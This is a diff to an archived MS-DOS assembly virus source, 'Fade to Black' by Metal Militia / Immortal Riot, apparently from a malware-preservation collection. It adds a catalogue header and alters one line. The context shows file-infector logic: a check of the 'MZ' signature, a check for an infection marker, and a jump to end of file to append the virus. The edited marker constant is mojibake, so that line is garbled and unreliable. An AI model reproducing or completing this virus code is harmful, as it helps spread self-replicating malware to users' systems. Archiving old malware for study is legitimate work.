@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; VirusName: Fade to Black
 ; Country  : Sweden
 ; Author   : Metal Militia / Immortal Riot
@@ -164,7 +175,7 @@ sub_2:		mov	di,sp			; God what I hate that Eskimo!
 		je	close
                 cmp     word ptr [si],'ZM'      ; Zimbowski Mark? (EXE?)
 		je 	close	
-mark:           cmp     word ptr [si+(mark-codebeg+4)],'½¾'     ; infected?
+mark:           cmp     word ptr [si+(mark-codebeg+4)],'ï¿½ï¿½'     ; infected?
                 je      close
 
 		call	put_eof			; move file ptr to EOF
